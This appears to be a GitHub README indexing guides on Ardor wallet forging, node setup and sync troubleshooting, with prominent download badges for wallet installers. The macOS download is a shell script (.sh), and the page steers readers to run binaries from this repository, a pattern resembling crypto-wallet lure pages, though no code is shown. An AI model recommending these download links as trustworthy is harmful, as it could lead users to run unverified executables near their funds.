![Ardor Wallet guides](assets/banner-hub.png)

<h1 align="center">Ardor forging and node guides</h1>

<p align="center">Forging, nodes and sync problems in the Ardor wallet, explained and fixed</p>

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-AGPL--3.0-1562a1?style=for-the-badge&labelColor=0c395d" alt="License: AGPL-3.0"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5"><img src="https://img.shields.io/badge/RELEASE-v2.6.5-1562a1?style=for-the-badge&labelColor=0c395d" alt="Release v2.6.5"></a></p>

---

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

This repository covers the machine side of the Ardor Wallet: what forging actually is, how a node earns the right to forge, what each client mode downloads, where the chain lives on disk, and what to do when the wallet will not sync at all. It exists because the questions people ask about forging are usually questions about a node they have not run yet.

It suits three readers: an operator who wants a node that stays online, a holder who wants to lease weight instead of running hardware, and anyone whose wallet shows a zero balance or a transaction that never confirms. Each guide starts from the symptom or the task, not from protocol theory, and reaches the steps quickly.

The groups follow that order of work. Forging and staking explains the reward, the balance threshold and the lease. Node and client setup covers the full and light clients, the database folder, ports and firewall rules, updates and the API. When it will not sync is the troubleshooting set: a zero balance, a stalled download, a Java error, an unconfirmed transaction, and the bundling mechanism that explains most child chain delays.

One caveat runs through the fix guides. A node that falls behind the network stops being useful, and an out-of-date node loses its peers, so updating is maintenance rather than an optional upgrade. Nothing in this repository asks for a passphrase or a private key: a node is configured through its property files, and a lease never moves coins.

The tables below list every guide in the repository by topic. If you are starting from nothing, read the client comparison before you install; if the wallet is already installed and misbehaving, go straight to the sync group.

## Start here

<div align="center">

| Guide | Why start here |
| --- | --- |
| [What forging means on Ardor, and why it is not mining](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md) | Forging is proof of stake block generation, not mining with hardware. |
| [Start forging ARDR in the wallet, and why it may not start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/start-forging-in-the-ardor-wallet.md) | Turn forging on, meet the balance threshold, and read the status panel. |
| [Ardor light client or full node: choose before you start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) | What each client mode downloads, and which one your machine needs. |

</div>

## All 16 guides in this repository

### Forging and staking

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What forging means on Ardor, and why it is not mining](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md) | Forging is proof of stake block generation, not mining with hardware. |
| [Start forging ARDR in the wallet, and why it may not start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/start-forging-in-the-ardor-wallet.md) | Turn forging on, meet the balance threshold, and read the status panel. |
| [Lease ARDR and earn fees without running a node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/lease-ardr-without-a-node-in-ardor-wallet.md) | Lease forging weight to another account without handing over the coins. |
| [What forgers actually earn, and what they do not](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forgers-actually-earn.md) | Fee income, not a block reward: the real economics of forging. |
| [How Ardor uses proof of stake, and its trade-offs](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-uses-proof-of-stake.md) | How forging weight is earned in a pure proof of stake network. |

</div>

### Node and client setup

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Ardor light client or full node: choose before you start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) | What each client mode downloads, and which one your machine needs. |
| [Where Ardor stores blockchain data, and how much space it takes](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/where-ardor-stores-blockchain-data.md) | The folder that holds the chain, and how much room it needs. |
| [Run an Ardor node from source](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/run-an-ardor-node-from-source.md) | Build and start an Ardor node from source on your own machine. |
| [Ardor node ports and the firewall rules that block them](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-node-ports-and-firewall.md) | The ports a node needs and the firewall rules that block a sync. |
| [Why an out-of-date Ardor node stops working](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/update-ardor-or-be-blacklisted.md) | Why an old node loses peers, and how to update without losing data. |
| [Ardor API and command line tools](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-api-and-command-line-tools.md) | How the REST API and command line tools talk to an Ardor node. |

</div>

### When it will not sync

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Why the Ardor wallet shows a zero balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) | Why the balance reads zero, and the quickest way to prove the funds exist. |
| [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md) | Step through the causes of a stalled sync, from peers to disk space. |
| [Fix the Java error that stops the Ardor wallet](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/fix-ardor-wallet-java-error.md) | Fix the runtime error that closes the wallet before its window appears. |
| [Why an Ardor transaction stays unconfirmed](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md) | Why a transaction sits unconfirmed, what its fee has to do with it, and what to check before retrying. |
| [How Ardor bundling works, why child chain users skip ARDR, and how to run a bundler](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-bundling-works.md) | How bundlers pay ARDR fees for child chain users, and how to run one. |

</div>

## More guides

- [ardor-wallet-guides](https://github.com/ardor-software/ardor-wallet-guides) - 23 guides
- [ardor-platform-guides](https://github.com/ardor-software/ardor-platform-guides) - 15 guides
- [The Ardor Wallet GitHub page](https://github.com/ardor-software/ardor-software) - the index of all 54
- [The Ardor desktop wallet](https://github.com/ardor-software/ardor-desktop-wallet) - download and release notes

---

## About

These guides describe the Ardor Wallet desktop application and the platform it connects to. Every installer comes from the release page, and the SHA-256 values published there are the ones to compare before a first run.

## License

AGPL-3.0
